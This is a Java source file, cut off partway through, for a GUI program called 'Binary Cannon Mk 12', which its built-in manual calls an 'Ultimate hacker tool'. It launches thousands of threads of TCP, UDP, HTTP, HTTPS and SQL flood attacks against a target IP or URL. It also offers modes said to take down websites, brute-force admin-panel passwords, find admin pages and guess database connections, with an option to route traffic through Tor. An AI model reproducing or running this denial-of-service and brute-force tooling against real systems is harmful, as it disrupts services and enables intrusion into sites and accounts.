import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Random;
import java.util.zip.GZIPOutputStream;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSocketFactory;
import javax.swing.BorderFactory;
import javax.swing.ButtonGroup;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JEditorPane;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.border.Border;
import javax.swing.border.TitledBorder;

import java.sql.*;

public class class1 {
	
	static Random r = new Random();
	static ArrayList<String> availablemethods = new ArrayList<String>();
	static boolean doingddos = false;
	
	static int dynamicclusterdelay;
	static int clusterstormexception;
	static int clusterstormhit;
	static double exceptiondividehit;
	
	static JTextField ipfield = new JTextField(15);
	static JTextField threadsfield = new JTextField(15);
	static JTextField bytesfield = new JTextField(15);
	static JTextField messagefield = new JTextField(15);
	
	static JButton b1 = new JButton("Start");
	static JButton b2 = new JButton("info");
	static JButton b3 = new JButton("Stop");
	
	static JRadioButton rb1 = new JRadioButton("TCP");
	static JRadioButton rb2 = new JRadioButton("UDP");
	static JRadioButton rb3 = new JRadioButton("HTTP");
	static JRadioButton rb4 = new JRadioButton("BF Password Break");
	static JRadioButton rb5 = new JRadioButton("Subsite Finder");
	static JRadioButton rb6 = new JRadioButton("Clusterstorm");
	static JRadioButton rb7 = new JRadioButton("HTTPS");
	static JRadioButton rb8 = new JRadioButton("SQL DDOS");
	static JRadioButton rb9 = new JRadioButton("I-Mod");
	static JCheckBox chb1 = new JCheckBox("Use Tor");
	
	static Color troncolor = new Color(24, 202, 230);
	static Border border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Ip | Url",TitledBorder.LEADING, 0, null, Color.green);
	static Border border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
	static Border border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Byte Size",TitledBorder.LEADING, 0, null, Color.green);
	static Border border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Not Used",TitledBorder.LEADING, 0, null, Color.green);
	
	static int threads;
	static ArrayList<String> adminpanellist = new ArrayList<String>();
	static JTextArea outputarea = new JTextArea();
	static String databaseurl = null;
	
	//static JEditorPane websitebrowser;
	
	public static void main(String[] args) throws Exception {
		
		JFrame f = new JFrame("Binary Cannon Mk 12");
		f.setLayout(new GridLayout(2, 1));
		f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		f.setSize(455, 580);
		f.setLocationRelativeTo(null);
		f.setResizable(false);
		Border border = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Options",TitledBorder.CENTER, 0, null, Color.green);
		
		ipfield.setBackground(Color.black);
		ipfield.setForeground(Color.white);
		threadsfield.setBackground(Color.black);
		threadsfield.setForeground(Color.white);
		threadsfield.setText("800");
		bytesfield.setBackground(Color.black);
		bytesfield.setForeground(Color.white);
		bytesfield.setText("45500");
		messagefield.setBackground(Color.black);
		messagefield.setForeground(Color.white);
		messagefield.setEditable(false);
		
		ipfield.setBorder(border2);
		threadsfield.setBorder(border3);
		bytesfield.setBorder(border4);
		messagefield.setBorder(border5);
		
		
		chb1.setBackground(Color.black);
		chb1.setForeground(Color.green);
		rb1.setBackground(Color.black);
		rb2.setBackground(Color.black);
		rb1.setForeground(Color.green);
		rb2.setForeground(Color.green);
		rb3.setBackground(Color.black);
		rb3.setForeground(Color.green);
		rb4.setBackground(Color.black);
		rb4.setForeground(Color.green);
		rb5.setBackground(Color.black);
		rb5.setForeground(Color.green);
		rb6.setBackground(Color.black);
		rb6.setForeground(Color.green);
		rb7.setBackground(Color.black);
		rb7.setForeground(Color.green);
		rb8.setBackground(Color.black);
		rb8.setForeground(Color.green);
		rb9.setBackground(Color.black);
		rb9.setForeground(Color.green);
		rb1.setSelected(true);
		ButtonGroup bg = new ButtonGroup();
		bg.add(rb1);
		bg.add(rb2);
		bg.add(rb3);
		bg.add(rb9);
		bg.add(rb5);
		bg.add(rb6);
		bg.add(rb7);
		bg.add(rb8);
		//al block for radio buttons
		ActionListener rb1al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Not Used",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("");
				messagefield.setEditable(false);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Byte Size",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("45500");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Ip | Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("800");
			}
		};rb1.addActionListener(rb1al);
		
		ActionListener rb2al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Message",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Not Used",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(false);
				bytesfield.setText("");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Ip | Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("80");
			}
		};rb2.addActionListener(rb2al);
		
		ActionListener rb3al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Http Method",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("GET");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Data to POST | PUT",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("null");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("2500");
			}
		};rb3.addActionListener(rb3al);
		ActionListener rb4al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Not Used",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("");
				messagefield.setEditable(false);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Username",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Admin Panel Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("80");
			}
		};rb4.addActionListener(rb4al);
		ActionListener rb5al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Not Used",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("");
				messagefield.setEditable(false);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Use List ? < y/n >",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("y");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("80");
			}
		};rb5.addActionListener(rb5al);
		ActionListener rb6al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "HTTP | HTTPS",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("http");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Cluster Delay ( auto = AI )",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("auto");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("15000");
			}
		};rb6.addActionListener(rb6al);
		ActionListener rb7al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Https Method",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("GET");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Data to POST | PUT",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("null");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("2500");
			}
		};rb7.addActionListener(rb7al);
		ActionListener rb8al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Database ( auto = AI )",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("auto");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Table",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("50");
			}
		};rb8.addActionListener(rb8al);
		ActionListener rb9al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				border5 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Payload Count",TitledBorder.LEADING, 0, null, Color.green);
				messagefield.setText("20");
				messagefield.setEditable(true);
				messagefield.setBorder(border5);
				
				border4 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Delay ( Millisec )",TitledBorder.LEADING, 0, null, Color.green);
				bytesfield.setBorder(border4);
				bytesfield.setEditable(true);
				bytesfield.setText("800");
				
				border2 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Url",TitledBorder.LEADING, 0, null, Color.green);
				ipfield.setBorder(border2);
				
				border3 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "Threads",TitledBorder.LEADING, 0, null, Color.green);
				threadsfield.setBorder(border3);
				threadsfield.setText("2500");
			}
		};rb9.addActionListener(rb9al);
		//end of al block
		
		ActionListener chb1al = new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				if(chb1.isSelected()){
					
					System.setProperty("http.proxySet", "true");
					System.setProperty("http.proxyHost", "127.0.0.1");
					System.setProperty("http.proxyPort","9100");
					System.setProperty("https.proxySet", "true");
					System.setProperty("https.proxyHost", "127.0.0.1");
					System.setProperty("https.proxyPort","9100");
					System.setProperty("socksProxyHost", "127.0.0.1");
			        System.setProperty("socksProxyPort", "9150");
					
					try{
						//ip check
					JPanel TorGui = new JPanel();
					TorGui.setLayout(new GridLayout(1,1));
					JEditorPane website = new JEditorPane("http://www.whatsmyip.org");
			        website.setEditable(false);
			        website.setContentType("text/html");
			        website.setOpaque(true);
			        website.setBackground(Color.white);
			        website.setForeground(Color.white);
			        TorGui.add(new JScrollPane(website));
			        TorGui.setVisible(true);
					
					//tor check
					JPanel TorGui2 = new JPanel();
					TorGui2.setLayout(new GridLayout(1,1));
					JEditorPane website2 = new JEditorPane("https://check.torproject.org/");
				    website2.setEditable(false);
				    website2.setContentType("text/html");
				    website2.setOpaque(true);
				    website2.setBackground(Color.white);
				    website2.setForeground(Color.white);
				    TorGui2.add(new JScrollPane(website2));
				    
				    //new tab
				    
				    /*
				  //ip check
					JPanel TorGui3 = new JPanel();
					TorGui3.setLayout(new GridLayout(1,1));
					JEditorPane website3 = new JEditorPane("http://www.whatsmyip.org");
					website3.setEditable(false);
					website3.setContentType("text/html");
					website3.setOpaque(true);
					website3.setBackground(Color.white);
					website3.setForeground(Color.white);
			        TorGui3.add(new JScrollPane(website3));
			        TorGui3.setVisible(true);
				    */
				    
				    //browser
				    JTabbedPane tabs = new JTabbedPane();
				    tabs.add("https://check.torproject.org/", TorGui2);
				    tabs.add("http://www.whatsmyip.org", TorGui);
				    //tabs.add("New Tab", TorGui3);
				    
				    JFrame torbrowser = new JFrame("Internal Tor Browser");
				    torbrowser.setLayout(new GridLayout(1,1));
				    torbrowser.setSize(640, 480);
				    torbrowser.setLocationRelativeTo(null);
				    torbrowser.add(tabs);
				    torbrowser.setVisible(true);
				    chb1.setEnabled(false);
				        
					}catch(Exception e1){
						
						chb1.setSelected(false);
						JOptionPane.showMessageDialog(null, "Proxy connection failed.\nstart Tor Browser Bundle then try again.","Proxy Error",JOptionPane.ERROR_MESSAGE);
						JOptionPane.showMessageDialog(null, e1.toString(),"Proxy Error",JOptionPane.ERROR_MESSAGE);
						
					}
					
					/*
					try{
					URL url = new URL("https://www.dan.me.uk/torcheck");
					//URLConnection urlConnection = url.openConnection();
					
					 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
		        	 connection.setDoOutput(true);
		    	     connection.setDoInput(true);
		    	     connection.setRequestMethod("GET");
		    	     connection.setRequestProperty("charset", "utf-8");
		    	     connection.setRequestProperty("Host", "localhost");
		    	     connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
		    	     connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		    	     connection.setRequestProperty("Content-Length", "param1=" + URLEncoder.encode("87845", "UTF-8"));
		    	     connection.setRequestProperty("Accept-Encoding", "gzip");
		    	     connection.setReadTimeout(9000);
		    	     connection.setConnectTimeout(9000);
		    	     connection.setUseCaches(false);
					
					InputStream is = connection.getInputStream();
					InputStreamReader isr = new InputStreamReader(is);

					int numCharsRead;
					char[] charArray = new char[1024];
					StringBuffer sb2 = new StringBuffer();
					while ((numCharsRead = isr.read(charArray)) > 0) {
						sb2.append(charArray, 0, numCharsRead);
					}
					String result = sb2.toString();
					System.out.println(result);
					}catch(Exception e1){}
					*/
					
					
				}
				
			}
		};chb1.addActionListener(chb1al);
		
		JPanel mainpanel = new JPanel();
		mainpanel.setBackground(Color.black);
		mainpanel.setLayout(new FlowLayout());
		JPanel options = new JPanel();
		options.setBorder(border);
		options.setBackground(Color.black);
		options.setForeground(Color.red);
		
		  //image and buttons
	      ImageIcon i = new ImageIcon(class1.class.getResource("anonymousbinary.jpg"));
	      JLabel label = new JLabel(i);
		
	    JPanel bottombuttonpanel = new JPanel();
	    bottombuttonpanel.setBackground(Color.black);
		
		b1.setBackground(Color.red);
		b1.setSize(20, 5);
		b2.setSize(20, 5);
		b3.setSize(20, 5);
		bottombuttonpanel.add(chb1);
		bottombuttonpanel.add(b2);
		bottombuttonpanel.add(b1);
		bottombuttonpanel.add(b3);
		
		//end of image and buttons
		
		ActionListener al = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				
				
				
				if(rb1.isSelected()){
				
				if(ipfield.getText().startsWith("http:")==false){
				try {
					ddostcp();
				}catch (Exception e1) {}
				chb1.setEnabled(false);
				b1.setEnabled(false);
				}else{
					JOptionPane.showMessageDialog(null, "TCP cannot be used with http:// or https:// so remove them","Protocol Error",JOptionPane.ERROR_MESSAGE);
				}
				
				}
				if(rb2.isSelected()){
					
					if(ipfield.getText().startsWith("http:")==false){
					try {
						ddosudp();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					}else{
						JOptionPane.showMessageDialog(null, "UDP cannot be used with http:// or https:// so remove them","Protocol Error",JOptionPane.ERROR_MESSAGE);
					}
					
				}
				if(rb3.isSelected()){
					
					try {
						ddoshttp();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb4.isSelected()){
					
					try {
						bruteforcepassword();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb5.isSelected()){
					
					try {
						subsitefinder();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb6.isSelected()){
					
					try {
						clusterstorm();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb7.isSelected()){
					
					try {
						ddoshttps();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb8.isSelected()){
					
					try {
						sqlddos();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				if(rb9.isSelected()){
					
					try {
						IMod();
					} catch (Exception e1) {e1.printStackTrace();}
					chb1.setEnabled(false);
					b1.setEnabled(false);
					
				}
				
				}
				
				
			
			};
			
			ActionListener al2 = new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					JOptionPane.showMessageDialog(null, "Ultimate hacker tool compatible with every OS that supports Java\nAlways use lastest version of Java for max performance\nHTTP and HTTPS methods are POST,DELETE,TRACE,PUT,GET,CONNECT\nSubsite Finder is used to find all subsites and files (including admin panels)\nif you want to look directly to admin panels, use common panel list (included in program).\nSQL DDOS uses sql connections to ddos sql servers\nenter table name like users and database name ( auto means search auto ) then watch the show :)\nClusterstorm is a special attack type made by myself and its used to ddos most challenging sites.\nClusterstorm works perfectly on 64 bit system. to use AI in Clusterstorm, leave cluster delay as auto or replace it with any integer values to disable AI\nClusterstorm requires more memory than other ddos types\nPress Start to start and press stop to cancel\nif you cant see internal Tor browser after pressing Tor button then start Tor Browser Bundle to open ports\nI-Mod is a new feature allows you to takedown any website with minimal network usage\nMade by BenerKaya. have fun :) and i dont take any responsibility so use at your own risk.\nNote: SQL DDOS currently in development so not works yet.","User Manual",JOptionPane.PLAIN_MESSAGE);
				}};
				
				ActionListener al3 = new ActionListener() {
					@Override
					public void actionPerformed(ActionEvent e) {
					
						try {
							doingddos = false;
							resetclusterstorm();
						} catch (Exception e1) {}
						b1.setEnabled(true);
					}
						
					
				};
				
				JPanel radiobuttons = new JPanel();
				radiobuttons.setLayout(new GridLayout(4,2));
				Border border6 = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.green), "DDOS Protocol | Other Features",TitledBorder.CENTER, 0, null, Color.green);
				radiobuttons.setBackground(Color.black);
				radiobuttons.setBorder(border6);
				radiobuttons.add(rb1);
				radiobuttons.add(rb5);
				radiobuttons.add(rb2);
				radiobuttons.add(rb9);
				radiobuttons.add(rb3);
				radiobuttons.add(rb8);
				radiobuttons.add(rb7);
				radiobuttons.add(rb6);
					
					b1.addActionListener(al);
					b2.addActionListener(al2);
					b3.addActionListener(al3);
					mainpanel.add(label);
					
					options.add(ipfield);
					options.add(threadsfield);
					options.add(bytesfield);
					options.add(messagefield);
					options.add(radiobuttons);
					options.add(bottombuttonpanel);
					
					resetclusterstorm();
					
					f.add(mainpanel);
					f.add(options);
					f.setVisible(true);
					
					
		
		
		

	}
	
	public static void resetclusterstorm(){
		
		dynamicclusterdelay = 500;
		clusterstormexception = 1;
		clusterstormhit = 1;
		exceptiondividehit = 0.0;
		
	}
	
	public static void ddostcp() throws IOException{
		
		doingddos = true;
		threads = Integer.parseInt(threadsfield.getText());
		
		try{
		for (int i = 0; i <= threads; i++) {
			DdosTcpThread thread = new DdosTcpThread();
	        thread.start();
			}
		}catch(Exception e1){e1.printStackTrace();}
		
	}
	
	public static void ddosudp() throws Exception{
		
		doingddos = true;
		threads = Integer.parseInt(threadsfield.getText());
		
		try{
		for (int i = 0; i <= threads; i++) {
		DdosUdpThread thread = new DdosUdpThread();
        thread.start();
		}
		}catch(Exception e1){e1.printStackTrace();}
		
		
		}
	
		
	
	
	public static void ddoshttp() throws Exception {
		
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		for (int i = 0; i <= threads; i++) {
		DdosHttpThread thread = new DdosHttpThread();
        thread.start();
		}
		/*
		for (int i = 0; i <= threads; i++) {
			Thread thread = new Thread(new DdosHttpThread());
			thread.setDaemon(true);
	        thread.start();
		}
		*/
		
		}
	
	public static void ddoshttps() throws Exception {
		
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		for (int i = 0; i <= threads; i++) {
		DdosHttpsThread thread = new DdosHttpsThread();
        thread.start();
		}
		
		}
	
	public static void databasefinder() throws Exception{
		
		String url = ipfield.getText();
		String urlmodified = url.substring(url.indexOf('/')+1, url.lastIndexOf('/'));
		
		if(messagefield.getText().equalsIgnoreCase("auto")){
			//database bruteforcer - port default
			
			String randomDB = RandomAscii(false, r.nextInt(8));
			
		String[] dburl = {"jdbc:mysql://"+urlmodified+"/"+randomDB,"jdbc:oracle:thin:@"+urlmodified+":7777:"+randomDB,"jdbc:db2:"+urlmodified+":50000/"+randomDB,"jdbc:sybase:Tds:"+urlmodified+":2638/"+randomDB};
		
		
		
		for (int i = 0; i < dburl.length; i++) {
			try{
			Connection conn = DriverManager.getConnection(dburl[i]);
			databaseurl = dburl[i];
			}catch(Exception e){e.printStackTrace();}
		}
		
		
		}else{
		
		String[] dburl = {"jdbc:mysql://"+urlmodified+"/"+messagefield.getText(),"jdbc:oracle:thin:@"+urlmodified+":7777:"+messagefield.getText(),"jdbc:db2:"+urlmodified+":50000/"+messagefield.getText(),"jdbc:sybase:Tds:"+urlmodified+":2638/"+messagefield.getText()};
		
		for (int i = 0; i < dburl.length; i++) {
			try{
			Connection conn = DriverManager.getConnection(dburl[i]);
			databaseurl = dburl[i];
			}catch(Exception e){e.printStackTrace();}
		}
		
		
		}
		
	}
	
	
	
	
	public static void sqlddos() throws Exception {
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		for (int i = 0; i <= threads; i++) {
		SQLThread thread = new SQLThread();
        thread.start();
		}
		
		   
		
	}
	
	public static void IMod() throws Exception {
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		for (int i = 0; i <= threads; i++) {
			IModThread thread = new IModThread();
	        thread.start();
		}
		
		   
		
	}
	
	public static String RandomAscii(boolean containsnumber,int size) {
		
		
		if(containsnumber==true){
		
		StringBuilder sb = new StringBuilder();
		//0 rakam 48 to 57
		//1 kucuk harf 97 to 122
		//2 buyuk harf 65 to 90
		for (int i = 0; i < size; i++) {
			
			int anyfromthree = r.nextInt(3);
			
			if (anyfromthree==0) {
				sb.append((char)(r.nextInt(10)+48));
			}
			if (anyfromthree==1) {
				sb.append((char)(r.nextInt(26)+97));
			}
			if (anyfromthree==2) {
				sb.append((char)(r.nextInt(26)+65));
			}
			
		}
		
		String generatedtext = sb.toString();
		return generatedtext;
		
		}
		
		else{
			
			StringBuilder sb = new StringBuilder();
			//0 rakam 48 to 57
			//1 kucuk harf 97 to 122
			//2 buyuk harf 65 to 90
			for (int i = 0; i < size; i++) {
				
				int anyfromthree = r.nextInt(2);
				
				if (anyfromthree==0) {
					sb.append((char)(r.nextInt(26)+97));
				}
				if (anyfromthree==1) {
					sb.append((char)(r.nextInt(26)+65));
				}
				
			}
			
			String generatedtext = sb.toString();
			return generatedtext;
			
			}
		
		
		
		
		
		
	}
		
	/*
	public static boolean checkfields(JTextField ip,JTextField threads,JTextField bytes,JTextField message){
		
		BitSet bitset = new BitSet();
		
		if(containsDigit(ip.getText())==true || ip.getText().startsWith("http://")==true || ip.getText().startsWith("https://")==true){bitset.set(0);}
		else{JOptionPane.showMessageDialog(null, "Enter as specified",null,JOptionPane.ERROR_MESSAGE);}
		
		if(rb6.isSelected()==false){
		if(containsDigit(threads.getText())==true){bitset.set(1);}
		else{JOptionPane.showMessageDialog(null, "Threads must be a number :)",null,JOptionPane.ERROR_MESSAGE);}
		}else{bitset.set(1);}
		
		if(rb1.isSelected()){
		int a = Integer.parseInt(bytes.getText());
		if(containsDigit(bytes.getText())==true && a<=65500 ){bitset.set(2);}
		else{JOptionPane.showMessageDialog(null, "Byte size must be a number\nwhich is <= 65500",null,JOptionPane.ERROR_MESSAGE);}
		}else{bitset.set(2);}
		
		if(bitset.get(0) && bitset.get(1) && bitset.get(2)){return true;}
		else{return false;}
		
	}
	*/
	public static boolean containsDigit(String s) {
	    boolean containsDigit = false;
	    
	    if (s != null && !s.isEmpty()) {
	        for (char c : s.toCharArray()) {
	            if (containsDigit = Character.isDigit(c)) {
	                break;
	            }
	        }
	    }
	   
	    return containsDigit;
	}
	
	/*
	public void hyperlinkUpdate(HyperlinkEvent event) throws Exception {
        HyperlinkEvent.EventType eventType = event.getEventType();
        if (eventType == HyperlinkEvent.EventType.ACTIVATED) {
            if (event instanceof HTMLFrameHyperlinkEvent) {
                HTMLFrameHyperlinkEvent linkEvent =
                        (HTMLFrameHyperlinkEvent) event;
                HTMLDocument document =
                        (HTMLDocument) websitebrowser.getDocument();
                document.processHTMLFrameHyperlinkEvent(linkEvent);
            } else {
                websitebrowser.setPage(event.getURL());
            }
        }
    }
    */
	
	public static void bruteforcepassword() throws Exception{
		
		doingddos=true;
		while(doingddos==true){
		
		StringBuilder sb = new StringBuilder();
		//0 rakam 48 to 57
		//1 kucuk harf 97 to 122
		//2 buyuk harf 65 to 90
		for (int i = 0; i < r.nextInt(12); i++) {
			
			int anyfromthree = r.nextInt(3);
			
			if (anyfromthree==0) {
				sb.append((char)(r.nextInt(10)+48));
			}
			if (anyfromthree==1) {
				sb.append((char)(r.nextInt(26)+97));
			}
			if (anyfromthree==2) {
				sb.append((char)(r.nextInt(26)+65));
			}
			
		}
		
		String generatedpassword = sb.toString();
		
		/*
		try {
			String webPage = ipfield.getText();
			String name = bytesfield.getText();
			String password = generatedpassword;

			String authString = name + ":" + password;
			System.out.println("auth string: " + authString);
			byte[] authEncBytes = Base64.encodeBase64(authString.getBytes());
			String authStringEnc = new String(authEncBytes);
			System.out.println("Base64 encoded auth string: " + authStringEnc);

			URL url = new URL(webPage);
			URLConnection urlConnection = url.openConnection();
			urlConnection.setRequestProperty("Authorization", "Basic " + authStringEnc);
			InputStream is = urlConnection.getInputStream();
			InputStreamReader isr = new InputStreamReader(is);

			int numCharsRead;
			char[] charArray = new char[1024];
			StringBuffer sb2 = new StringBuffer();
			while ((numCharsRead = isr.read(charArray)) > 0) {
				sb2.append(charArray, 0, numCharsRead);
			}
			String result = sb2.toString();

			System.out.println("*** BEGIN ***");
			System.out.println(result);
			System.out.println("*** END ***");
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
		*/
		}
	}
	
	public static void subsitefinder() throws Exception{
		
		doingddos=true;
		threads = Integer.parseInt(threadsfield.getText());
		
		
		
		if(bytesfield.getText().equalsIgnoreCase("y")){
		adminfinder();
		}
		
		
		if(bytesfield.getText().equalsIgnoreCase("n")){
		for (int i = 0; i <= threads; i++) {
